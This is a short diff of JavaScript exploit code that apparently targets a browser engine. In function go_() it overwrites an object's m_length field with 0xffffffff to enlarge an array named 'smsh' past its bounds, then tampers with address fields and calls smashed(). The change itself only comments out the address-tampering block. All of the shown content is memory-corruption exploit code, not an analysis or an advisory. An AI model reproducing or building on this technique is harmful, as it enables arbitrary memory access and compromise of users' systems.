@@ -210,6 +210,7 @@ function go_() {
 				stale[0][6] = 0xffffffff; // Overide m_length field
 				alert("New smsh len:" + smsh.length);
 				
+				/*
 				bck = stale[0][4];
  				stale[0][4] = 0; // address, low 32 bits
  				// stale[0][5] = 1; // address, high 32 bits == 0x100000000
@@ -222,6 +223,7 @@ function go_() {
  				if (smsh.length != 0x10) {
  					smashed(stale[0]);
  				}
+				*/
 				
 				
 				
